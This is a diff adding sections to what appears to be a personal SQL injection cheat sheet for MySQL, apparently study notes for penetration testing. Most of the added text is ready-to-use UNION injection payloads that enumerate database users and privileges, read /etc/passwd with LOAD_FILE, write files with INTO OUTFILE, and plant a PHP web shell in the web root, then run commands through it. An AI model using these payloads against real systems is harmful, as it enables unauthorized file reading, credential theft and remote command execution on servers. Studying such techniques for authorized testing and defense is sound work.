@@ -134,3 +134,114 @@ Getting the Data
 ```sql
 test') UNION select 1,2,<column1,column2 from <dbname.table>-- 
 ```
+
+## Reading Files
+> DB User must have `FILE` privilege.
+
+### Find out which user we are:
+```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+
+# Injection
+cn' UNION SELECT 1, user(),3,4--
+```
+
+### Find our Priv's
+```sql
+# SQL
+SELECT super_priv FROM mysql.user
+
+# Injection
+cn' UNION select 1, super_priv, 3, 4 FROM mysql.user--
+
+# Injection in a DB with alot of users
+cn' UNION select 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'--
+
+# Dumping other priv's from schema
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
+
+# Dumping all priv's for a user
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM informatiion_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
+```
+
+### `LOAD_FILE`
+:warning: WE can only read files if the MySQL user has file system permissions to the file.
+```sql
+# SQL
+SELECT LOAD_FILE('/etc/passwd');
+
+# Injection
+cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- 
+```
+
+## Writing Files
+### Write File Privileges
+1. User with `FILE` privilege enabled
+2. MySQL global `secure_file_priv` variable not enabled
+3. Write access to the location we want to write to on the back-end server.
+
+### `secure_file_priv`
+`secure_file_prive` variable determines where we can read/write files from. If it is not set, we can access the whole file system. If it is set, we can only read/write to that path, if it is `NULL`, we can't read/write to the file system at all.
+
+SQL to enumerate `secure_file_priv`:
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv'
+```
+:warning: You can't use this in a `SELECT` statement.
+
+MySQL global variabls are stored in `information_schema.global_variables` that has 2 columns `variable_name` and `variable_value` which we can access. There are alot of variables in this table, so it is best to use a `WHERE` to filter those results.
+
+Example SQL Query:
+```sql
+SELECT variable_name, variable_value from information_schema.global_variables where variable_name='secure_file_priv';
+```
+
+Example injection using our above DB
+```sql
+cn' UNION select 1, variable_name, variable_value, 4 from information_schema.global_variables where variable_name='secure_file_priv'-- 
+```
+If the value is empty, then we can read the entire file system, as long as the other conditions are true.
+
+### `SELECT INTO OUTFILE`
+We can generally add `INTO OUTFILE ...` to the end of our query to write the results to a file.
+SQL Example:
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+# Dumps the Users table into a file at /tmp/credentials
+```
+SQL Example of writing arbitrary strings to a file
+```sql
+select 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+> Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.   
+
+Injection Example writing 'file written successfully' into file /var/www/html/proof.txt
+```sql
+cn' union select 1, "file written successfully", 3, 4 into outfile '/var/www/html/proof.txt'-- 
+# If no errors on the page, your file probably succeeded
+```
+> Note: In the above example, you would have a text file that read "1   file written successfully   3   4" because the other columns would be written to the file as well. You can get around this by using quotes instead of numbers in the other columns, such as
+```sql
+cn' union select "", "file written successfully", "", "" into outfile 'var/www/html/proof.txt'-- 
+```
+
+### Writing a web shell
+We can use `OUTFILE` to write a webshell to the web directory
+ExampLe Shell:
+```php
+<?php system($_REQUEST[0]); ?>
+```
+> Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
+
+Example injection to write our shell
+```sql
+cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
+```
+
+Now we can verify by browing to shell.php and using the shell parameter:
+```url
+http://serverip:port/shell.php?0=id
+# The output of `id` confirms our shell is working
+```
